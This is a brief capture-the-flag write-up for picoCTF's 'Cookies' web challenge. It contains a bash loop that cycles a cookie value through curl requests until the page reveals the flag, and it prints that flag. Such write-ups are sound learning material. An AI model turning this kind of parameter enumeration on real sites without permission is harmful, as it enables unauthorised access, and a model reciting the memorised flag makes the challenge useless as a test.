# Cookies

## Overview
Points: 40 | Category: Web Exploitation

## Description
> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/

## Step 1
Analysing the website it's possible to see that the cookie is set to 'name=-1', so I made a script try out different values and find the word pico inside the request.
``` Bash 
#! /bin/bash

for number in {0..20}
do
	echo "Cookie: name=$number"
	curl -sL http://mercury.picoctf.net:21485/ -H "Cookie: name=$number" | grep pico
done
```

## Step 2
If we set 'Cookie: name=18', it gives the flag. 
``` Html
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
```

## Flag
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}